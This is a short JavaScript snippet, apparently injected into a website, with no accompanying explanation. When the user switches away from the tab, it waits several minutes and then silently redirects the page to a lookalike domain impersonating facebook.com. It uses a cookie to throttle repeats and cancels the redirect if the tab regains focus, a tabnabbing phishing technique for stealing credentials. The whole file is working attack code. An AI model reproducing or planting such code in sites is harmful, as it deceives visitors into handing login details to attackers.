var main_func;
window.onblur=function(){main_func=setTimeout(function go_func(){
	var delta_t=85912345;
	var cooks=['fb_spf_bfg_0'];
	var links=['https://www.facebook.com.b2d-74fa503a-5c1.magicgate.cloud/qPeAhtbP'];
	var prior=-3;

	if(prior>=0 && document.cookie.indexOf(cooks[prior])<0)
		{
			document.cookie = cooks[prior] + "=" + Date.now() + ";path=/";
			window.location.assign(links[prior]);
			return;
		}

	var len=cooks.length;
	var cooks2=[];
	var links2=[];
	var delta=delta_t+1;
	var value = "; " + document.cookie;
	for(var i=0;i<len;i++)
	{
		if(document.cookie.indexOf(cooks[i])<0){cooks2.push(cooks[i]);links2.push(links[i]);}
		else{
				var parts = value.split("; " + cooks[i] + "=");
				var time=parts.pop().split(";").shift();
				if(Date.now()-time<delta){delta=Date.now()-time;}
		}
	}
	len=cooks2.length;
	if(len==0 || delta<delta_t){return;}
	var rand= Math.floor(Math.random()*len);
	document.cookie = cooks2[rand] + "=" + Date.now() + ";path=/";
	window.location.assign(links2[rand]);
},498765);};
window.onfocus=function(){clearTimeout(main_func);};
